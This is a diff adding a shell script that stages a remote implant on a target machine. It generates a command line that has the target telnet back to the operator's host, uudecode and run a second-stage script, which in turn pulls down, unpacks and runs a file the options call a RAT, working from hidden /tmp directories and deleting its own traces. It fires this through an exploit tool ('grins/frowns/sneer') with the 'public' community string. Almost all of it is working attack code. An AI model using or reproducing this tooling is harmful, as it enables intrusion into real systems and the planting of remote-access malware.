@@ -1,0 +1,125 @@
+#!/bin/sh
+
+##########################################################
+### Generate & run the following scripts:
+### 	- script to upload grinch on target (gr_upload.scr)
+### 	- script to upload gr_upload.scr (initial_upload.scr)
+### 	- run grins/frowns/whatever using the above scripts
+##########################################################
+
+# Some default values
+SCRIPT="/tmp/.t"
+DIR="/tmp/..."
+GS_OPTION=frowns
+
+# Show usage and exit
+usage() {
+    echo ""
+    echo "Before running this script, you first need to run the following:"
+    echo "      nc -l -p localPort < file2Xfer&Run.uu"
+    echo "      (nc must be in your path; it's also run w/in this script)"
+    echo "where file2Xfer&Run.uu is a compressed, uuencoded file."
+    echo ""
+    echo ""
+    echo "Usage: ${0} [options] -- [options to <file2Xfer&Run>]"
+    echo "  -i <remoteIP>                (required)"
+    echo "  -g <grins|frowns|sneer>      def= $GS_OPTION"
+    echo "  -l <localIP>                 (required)"
+    echo "  -n <localPort>               (no default)"
+    echo "  -u <script_upload_port>      (required)"
+    echo "  -f <file2Xfer&Run>           (required)"
+    echo "  -D <remoteDir>               def= $DIR"
+    echo "  -S <remoteScript>            def= $SCRIPT"
+    echo "  -E <RATenvironment vars>     (no default)"
+    echo "  -A <RATarguments>            (no default)"
+    exit 1
+}
+
+# There must be at least one argument
+if [ ${#} -eq 0 ]; then
+    usage
+fi
+
+#
+# Process args
+#
+    RATENVS=""
+    RATARGS=""
+    while getopts g:i:l:n:u:f:D:S:E:A op; do
+	case $op in
+	g)  GS_OPTION="$OPTARG";;
+	i)  REMOTE_IP="$OPTARG";;
+	l)  LOCAL_IP="$OPTARG";;
+	n)  LOCAL_PORT="$OPTARG";;
+	u)  SCR_UPLOAD_PORT="$OPTARG";;
+	f)  RUN_FILE="$OPTARG";;
+	D)  DIR="$OPTARG";;
+	S)  SCRIPT="$OPTARG";;
+	E)  RATENVS="$OPTARG";;
+	A)  RATARGS="$OPTARG";;
+	esac
+    done
+    cmdFlag="-c"
+    shift `expr $OPTIND - 1`
+
+    # Check for required args
+    [ -z "$REMOTE_IP" ] && echo "Error: missing remote IP" && usage
+    [ -z "$LOCAL_IP" ] && echo "Error: missing local IP" && usage
+    [ -z "$SCR_UPLOAD_PORT" ] && echo "Error: missing script upload port" && usage
+
+EXTRA="${*}"
+
+##### ORIG initial_upload.scr
+#### /sbin/sh -c (/usr/bin/telnet	$LOCAL_IP	$SCR_UPLOAD_PORT>$SCRIPT.uu	2>/dev/null;/usr/bin/uudecode	$SCRIPT.uu	2>/dev/null;/usr/bin/chmod	700	$SCRIPT;$SCRIPT	2>/dev/null	>/dev/null;)&
+
+echo CommandLine: ${0} ${*}
+echo ""
+
+echo "Generating initial upload script." 
+cat > initial_upload.scr << EOF
+/sbin/sh -c (/usr/bin/telnet	$LOCAL_IP	$SCR_UPLOAD_PORT>$SCRIPT.uu	</dev/console	2>/dev/null;/usr/bin/uudecode	$SCRIPT.uu	2>/dev/null;/usr/bin/chmod	700	$SCRIPT;$SCRIPT	2>/dev/null	>/dev/null;)&
+EOF
+
+echo "Generating grinch upload script." 
+cat > gr_upload.scr << EOF
+#!/bin/sh
+mkdir $DIR;
+cd $DIR;
+telnet $LOCAL_IP $LOCAL_PORT </dev/console > $DIR/$RUN_FILE.uu; 
+uudecode $DIR/$RUN_FILE.uu;  
+uncompress -f $DIR/$RUN_FILE.Z ;
+chmod +x $DIR/$RUN_FILE;
+cd $DIR; 
+PATH=${DIR} ${RATENVS} ${RUN_FILE} ${RATARGS} ${EXTRA}
+rm $SCRIPT.uu;
+rm $SCRIPT;
+EOF
+
+### uuencode gr_upload.scr
+   uuencode gr_upload.scr $SCRIPT > gr_upload.uu 
+
+echo "You now need to run \"socket\" in a couple of windows as follows:"
+echo "      socket -q -s $SCR_UPLOAD_PORT  < ./gr_upload.uu "
+echo "      socket -q -s $LOCAL_PORT	< ./$RUN_FILE.uu "
+echo "      (Each will die when its file xfer is completed)."
+echo "		-- OR --"
+echo "      nc -l -p $SCR_UPLOAD_PORT  < ./gr_upload.uu "
+echo "      nc -l -p $LOCAL_PORT    < ./$RUN_FILE.uu "
+echo "         (...and watch tcpdump)"
+echo "(Hit return when you've got these started)"
+read input
+
+
+echo "now running:  "
+echo "  ./${GS_OPTION} ${REMOTE_IP} ./initial_upload.scr public "
+./${GS_OPTION} ${REMOTE_IP} ./initial_upload.scr public
+
+echo "Looking to see if socket is still running locally"
+ps -eaf | grep -w socket | grep -v grep
+
+### echo "removing intermediate scripts"
+### rm ./gr_upload.scr ./initial_upload.scr ./gr_upload.uu 
+
+echo Done.
+echo
+echo "Don't forget to look for stray telnets running on target."
